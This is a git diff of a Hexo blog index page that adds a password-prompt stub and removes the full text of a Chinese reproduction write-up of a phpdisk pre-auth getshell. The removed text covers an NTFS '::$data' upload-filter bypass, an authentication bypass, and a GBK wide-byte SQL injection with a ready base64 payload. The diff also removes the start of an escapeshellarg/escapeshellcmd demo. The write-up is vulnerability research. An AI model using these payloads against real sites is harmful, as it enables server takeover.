@@ -16,7 +16,17 @@
 
 <html class="theme-next muse use-motion" lang="">
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
+  <script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
@@ -71,7 +81,7 @@
     scheme: 'Muse',
     version: '7.2.0',
     sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
     copycode: {"enable":false,"show_result":false,"style":null},
     fancybox: false,
     fastclick: false,
@@ -279,12 +289,172 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/12/Discuz-ML-V3-X-代码注入分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cookie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/name.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="The clown is laughing at you">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/12/Discuz-ML-V3-X-代码注入分析/" class="post-title-link" itemprop="url">Discuz!ML V3.X 代码注入分析</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-07-12 13:39:59 / Geändert am: 20:34:00" itemprop="dateCreated datePublished" datetime="2019-07-12T13:39:59+08:00">2019-07-12</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/12/Discuz-ML-V3-X-代码注入分析/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/11/xxxdisk前台Getshell-复现/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -380,34 +550,19 @@
       
         
           
-            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>跟着同学复现了一波,前台Getshell<br>参考链接:<br><a href="https://od0d.cn/2019/07/09/phpdisk%E5%89%8D%E5%8F%B0Getshell-%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">phpdisk前台Getshell(复现)</a><br><a href="https://xz.aliyun.com/t/5594#toc-1" target="_blank" rel="noopener">代码审计 xxxdisk前台Getshell</a></p>
-<h1 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h1><p>选择的cms是phpdisk，在Windows平台的GBK版本上，挖掘到了一个无需登录的前台Getshell。</p>
-<p>同学告诉我，在审计初，最好要看看该cms的路由和全局变量过滤情况<br>然后查看之后确实是存在文件dosafe.php，将所有sql注入的参数过滤了个遍。</p>
-<h1 id="0x02-漏洞成因"><a href="#0x02-漏洞成因" class="headerlink" title="0x02 漏洞成因"></a>0x02 漏洞成因</h1><p>(1)从mydisk.php为权限判断未exit导致可以越权访问mydisk.php</p>
-<p>(2)利用windows下的NTFS ADS流trick绕过文件名后缀限制</p>
-<p>(3)通过phpdisk的版本iconv编码转化使用不当造成宽字节注入找到后台(已知漏洞)</p>
-<h1 id="0x03-文件上传漏洞"><a href="#0x03-文件上传漏洞" class="headerlink" title="0x03 文件上传漏洞"></a>0x03 文件上传漏洞</h1><p>用户注册后尝试上传一个php文件，到服务器中查看该文件，会发现该文件被转成txt类型的文件<br><img src="/2019/07/11/xxxdisk前台Getshell-复现/1.png" alt=""></p>
-<p>然后看看怎么绕过这个后缀限制,文件上传操作封装在函数<strong>upload_file()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpdisk/includes/function/global.func.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">($source, $target)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (function_exists(<span class="string">'move_uploaded_file'</span>) &amp;&amp; @move_uploaded_file($source, $target)) &#123;</span><br><span class="line">		@chmod($target, <span class="number">0666</span>);</span><br><span class="line">		<span class="keyword">return</span> $target;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (@copy($source, $target)) &#123;</span><br><span class="line">		@chmod($target, <span class="number">0666</span>);</span><br><span class="line">		<span class="keyword">return</span> $target;</span><br><span class="line">	&#125; <span class="keyword">elseif</span> (@is_readable($source)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($fp = @fopen($source,<span class="string">'rb'</span>)) &#123;</span><br><span class="line">			@flock($fp,<span class="number">2</span>);</span><br><span class="line">			$filedata = @fread($fp,@filesize($source));</span><br><span class="line">			@fclose($fp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($fp = @fopen($target, <span class="string">'wb'</span>)) &#123;</span><br><span class="line">			@flock($fp, <span class="number">2</span>);</span><br><span class="line">			@fwrite($fp, $filedata);</span><br><span class="line">			@fclose($fp);</span><br><span class="line">			@chmod ($target, <span class="number">0666</span>);</span><br><span class="line">			<span class="keyword">return</span> $target;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>然後查看哪些地方調用了該函數，該函數調用有兩處，我們這次的漏洞在第一處，<br>位于<strong>phpdisk/modules/upload.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码第70行</span></span><br><span class="line">...</span><br><span class="line">$file_ext = get_real_ext($file_extension);</span><br><span class="line">$dest_file = $file_real_path.$file_store_path.$file_real_name_store.$file_ext;</span><br><span class="line"><span class="keyword">if</span>(upload_file($file[<span class="string">'tmp_name'</span>],$dest_file))&#123;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>使用函数<strong>get_real_ext()</strong>来处理后缀<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpdisk/includes/function/global.func.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_real_ext</span><span class="params">($file_extension)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $settings;</span><br><span class="line">	$file_extension = trim($file_extension);</span><br><span class="line">	<span class="keyword">if</span>($file_extension)&#123;</span><br><span class="line">		$exts = explode(<span class="string">','</span>,$settings[<span class="string">'filter_extension'</span>]);</span><br><span class="line">		<span class="keyword">if</span>(in_array($file_extension,$exts))&#123;</span><br><span class="line">			$file_ext = <span class="string">'.'</span>.$file_extension.<span class="string">'.txt'</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$file_ext = <span class="string">'.'</span>.$file_extension;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$file_ext = <span class="string">'.txt'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $file_ext;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>使用黑名单filter_extension对后缀名进行修改添加<code>.txt</code>防止像php这样的恶意文件。<br>filter_extension位于：<code>/admin/setting.inc.php/38行</code><br>此处绕过的方法，是<strong>我们控制文件名为：<code>test.php::$data</code></strong>，就可以绕过。</p>
-<p>原理：<br>php在window的时候如果文件名为：文件名+<strong>::$DATA</strong>，此时会把<strong>::$DATA</strong>之后的数据当成文件流处理,不会检测后缀名.且保持<strong>::$DATA</strong>之前的文件名。</p>
-<p>参考:<a href="https://xz.aliyun.com/t/2539#toc-0" target="_blank" rel="noopener">渗透测试的WINDOWS NTFS技巧集合</a></p>
-<h1 id="0x04-权限绕过"><a href="#0x04-权限绕过" class="headerlink" title="0x04 权限绕过"></a>0x04 权限绕过</h1><p>关键代码<code>mydisk.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">#	Project: PHPDISK File Storage Solution</span></span><br><span class="line"><span class="comment">#	This is NOT a freeware, use is subject to license terms.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	Site: http://www.phpdisk.com</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	$Id: mydisk.php 25 2014-01-10 03:13:43Z along $</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#	Copyright (C) 2008-2014 PHPDisk Team. All Rights Reserved.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"includes/commons.inc.php"</span>;</span><br><span class="line"></span><br><span class="line">phpdisk_core::user_login();</span><br><span class="line"></span><br><span class="line">define(<span class="string">'IN_MYDISK'</span> ,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fix firefox</span></span><br><span class="line"><span class="keyword">if</span>($item ==<span class="string">'upload'</span>)&#123;</span><br><span class="line">	$uid = (int)gpc(<span class="string">'uid'</span>,<span class="string">'GP'</span>,<span class="number">0</span>);</span><br><span class="line">	$pd_is_activated = @$db-&gt;result_first(<span class="string">"select is_activated from &#123;$tpf&#125;users where userid='$uid'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure></p>
-<p>查看<code>phpdisk_core::user_login()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">user_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $pd_uid,$pd_pwd;</span><br><span class="line">		<span class="keyword">if</span>(!$pd_uid || !$pd_pwd)&#123;</span><br><span class="line">			header(<span class="string">"Location: "</span>.urr(<span class="string">"account"</span>,<span class="string">"action=login&amp;ref="</span>.$_SERVER[<span class="string">'REQUEST_URI'</span>]));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>这里认证没有通过仅仅只是302，并没有退出程序，当时不理解302为什么可以？<br>同学告诉我，302的话，就算没有在没有注册的情况下，程序检测到后，不会强制退出程序，而是继续执行mydisk.php接下来的代码</p>
-<h1 id="0x05-未授权上传"><a href="#0x05-未授权上传" class="headerlink" title="0x05 未授权上传"></a>0x05 未授权上传</h1><p><img src="/2019/07/11/xxxdisk前台Getshell-复现/2.png" alt=""><br>上传成功</p>
-<h1 id="0x06-宽字节注入"><a href="#0x06-宽字节注入" class="headerlink" title="0x06 宽字节注入"></a>0x06 宽字节注入</h1><p>此程序分为两个版本utf-8与gbk版，所以难免会有一些编码转换的地方，所以也难免发生不小心没有注意的地方。<br>函数<strong>convert_str()</strong>提供编码转换的功能<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glbal.inc.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert_str</span><span class="params">($in,$out,$str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $db;</span><br><span class="line">	$str = $db-&gt;escape($str);</span><br><span class="line">	<span class="keyword">if</span>(function_exists(<span class="string">"iconv"</span>))&#123;</span><br><span class="line">		$str = iconv($in,$out,$str);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(function_exists(<span class="string">"mb_convert_encoding"</span>))&#123;</span><br><span class="line">		$str = mb_convert_encoding($str,$out,$in);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $db-&gt;escape($str);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>查看调用该函数的文件，此处利用ajax.php一次宽字节注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ajax.php</span></span><br><span class="line"><span class="keyword">switch</span>($action)&#123;</span><br><span class="line">	...</span><br><span class="line">    $data = trim(gpc(<span class="string">'data'</span>,<span class="string">'P'</span>,<span class="string">''</span>));	</span><br><span class="line">    <span class="keyword">if</span>(strpos($data,<span class="string">','</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">	   $file = unserialize(base64_decode($data));</span><br><span class="line">				<span class="comment">/*foreach($file as $k=&gt;$v)&#123;</span></span><br><span class="line"><span class="comment">				$file[$k] = $db-&gt;escape($file[$v]);</span></span><br><span class="line"><span class="comment">				&#125;*/</span></span><br><span class="line">				$file[file_id] = (int)$file[file_id];</span><br><span class="line">				$file[file_size] = (int)$file[file_size];</span><br><span class="line">				$file[file_description] = $db-&gt;escape(trim($file[file_description]));</span><br><span class="line">				$file[file_extension] = $db-&gt;escape(trim($file[file_extension]));</span><br><span class="line">				$file[file_name] = $db-&gt;escape(trim($file[file_name]));</span><br><span class="line">				$num = @$db-&gt;result_first(<span class="string">"select count(*) from &#123;$tpf&#125;files where yun_fid='&#123;$file[file_id]&#125;' and userid='$pd_uid'"</span>);</span><br><span class="line">				<span class="keyword">if</span>($num &amp;&amp; $file[file_id])&#123;</span><br><span class="line">					$tmp_ext = $file[file_extension] ? <span class="string">'.'</span>.$file[file_extension] : <span class="string">''</span>;</span><br><span class="line">					$msg = $file[file_name].$tmp_ext;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					$report_status =<span class="number">0</span>;</span><br><span class="line">					$report_arr = explode(<span class="string">','</span>,$settings[<span class="string">'report_word'</span>]);</span><br><span class="line">					<span class="keyword">if</span>(count($report_arr))&#123;</span><br><span class="line">						<span class="keyword">foreach</span>($report_arr <span class="keyword">as</span> $value)&#123;</span><br><span class="line">							<span class="keyword">if</span> (strpos($file[<span class="string">'file_name'</span>],$value) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">								$report_status = <span class="number">2</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$ins = <span class="keyword">array</span>(</span><br><span class="line">					<span class="string">'yun_fid'</span> =&gt; $file[file_id],</span><br><span class="line">					<span class="string">'file_name'</span> =&gt; $file[file_name],</span><br><span class="line">					<span class="string">'file_key'</span> =&gt; $file_key,</span><br><span class="line">					<span class="string">'file_extension'</span> =&gt; $file[file_extension],</span><br><span class="line">					<span class="string">'file_mime'</span> =&gt; <span class="string">'application/octet-stream'</span>,</span><br><span class="line">					<span class="string">'file_description'</span> =&gt; $file[file_description],</span><br><span class="line">					<span class="string">'file_size'</span> =&gt; $file[<span class="string">'file_size'</span>],</span><br><span class="line">					<span class="string">'file_time'</span> =&gt; $timestamp,</span><br><span class="line">					<span class="string">'is_checked'</span> =&gt; $is_checked,</span><br><span class="line">					<span class="string">'in_share'</span> =&gt; $in_share,</span><br><span class="line">					<span class="string">'report_status'</span> =&gt; $report_status,</span><br><span class="line">					<span class="string">'userid'</span> =&gt; $pd_uid,</span><br><span class="line">					<span class="string">'folder_id'</span> =&gt; $folder_id ? $folder_id : <span class="number">-1</span>,</span><br><span class="line">					<span class="string">'ip'</span> =&gt; $onlineip,</span><br><span class="line">					);</span><br><span class="line">					$sql = <span class="string">"insert into &#123;$tpf&#125;files set "</span>.$db-&gt;sql_array($ins).<span class="string">";"</span>;</span><br><span class="line">					$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br><span class="line">				&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></p>
-<p>关键代码在：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into &#123;$tpf&#125;files set "</span>.$db-&gt;sql_array($ins).<span class="string">";"</span>;</span><br><span class="line">$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br></pre></td></tr></table></figure></p>
-<p>跟进函数<strong>sql_array()</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_array</span> <span class="params">($arr)</span></span>&#123;</span><br><span class="line">		$ins = <span class="keyword">array</span>();</span><br><span class="line">		reset($arr);</span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">list</span>($c, $v) = each($arr))&#123;</span><br><span class="line">			$ins[] = ($v === <span class="keyword">NULL</span> ? sprintf(<span class="string">'`%s`=NULL'</span>, $c) : sprintf(<span class="string">'`%s`=\'%s\''</span>, $c, $v));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> implode(<span class="string">', '</span>, $ins);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
-<p>并且<strong>$ins</strong>=&gt;<strong>$file = unserialize(base64_decode($data))</strong>=&gt;<strong>$data = trim(gpc(‘data’,’P’,’’))</strong><br>所以我们可以传入$data,来控制$ins的值<br>将我们的输入base64解码后，反序列化成数组对象，最后传入sql语句。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db-&gt;query_unbuffered(is_utf8() ? $sql : iconv(<span class="string">'utf-8'</span>,<span class="string">'gbk'</span>,$sql));</span><br></pre></td></tr></table></figure></p>
-<p>最后执行语句的时候存在一处编码转换，也是这里直接导致了注入。<br>汉字在utf下为三个字节，在gbk下为两个字节，故而当我们传入的单引号被转义后<strong>\’</strong>，该单引号将会连同前三个字节在GBK下，被解释为两个字符，使得单引号逃逸。</p>
-<h1 id="0x07-漏洞复现"><a href="#0x07-漏洞复现" class="headerlink" title="0x07  漏洞复现"></a>0x07  漏洞复现</h1><p>(1)无权限下上传shell(刚才已上传过shell.php)<br>(2)上传成功后通过sql注入获取shell文件的位置。<br>需要获取文件位置，那么我们需要一个可以回显文件位置的地方，这里存在回显的地方，我们在页面上看，也就标签处可以回显，也就是file_description，故而构造payload为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"file_id"</span>=&gt;<span class="string">"17007"</span>,<span class="string">"file_name"</span>=&gt;<span class="string">"od錦',`in_share`=1,`file_description`=(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_extension=0x7068703a3a2464617461)x)#"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>即：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImZpbGVfaWQiO3M6NDoiMTAwMCI7czo5OiJmaWxlX25hbWUiO3M6MTYyOiK5/icsYGluX3NoYXJlYD0xLGBmaWxlX2Rlc2NyaXB0aW9uYD0oc2VsZWN0IHguYSBmcm9tIChzZWxlY3QgY29uY2F0KGZpbGVfc3RvcmVfcGF0aCxmaWxlX3JlYWxfbmFtZSlhIGZyb20gcGRfZmlsZXMgd2hlcmUgZmlsZV9leHRlbnNpb249MHg3MDY4NzAzYTNhMjQ2NDYxNzQ2MSl4KSMiO30=</span><br></pre></td></tr></table></figure></p>
-<p>不知道为什么这台电脑的数据库死活传不入数据库，但是复现的过程就是这样，可以参考参考链接的文章。</p>
-
+            <p>
+              
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/11/xxxdisk前台Getshell-复现/#more" rel="contents">
+                Weiterlesen &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -469,7 +624,7 @@
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="cookie">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/name.png">
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
@@ -555,15 +710,19 @@
       
         
           
-            <p>前言：escapeshellarg()与escapeshellcmd()在共同使用的情况下将会出现引号逃逸的情况</p>
-<h1 id="0x01-demo"><a href="#0x01-demo" class="headerlink" title="0x01 demo"></a>0x01 demo</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($email)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'to'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'to'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">'to'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'to'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'from'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'from'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $data[<span class="string">'from'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'from'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'subject'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'subject'</span>] = <span class="string">'No Subject'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'message'</span>])) &#123;</span><br><span class="line">      $data[<span class="string">'message'</span>] = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mail($data[<span class="string">'to'</span>], $data[<span class="string">'subject'</span>], $data[<span class="string">'message'</span>],</span><br><span class="line">      <span class="string">''</span>, <span class="string">"-f"</span> . $data[<span class="string">'from'</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure>
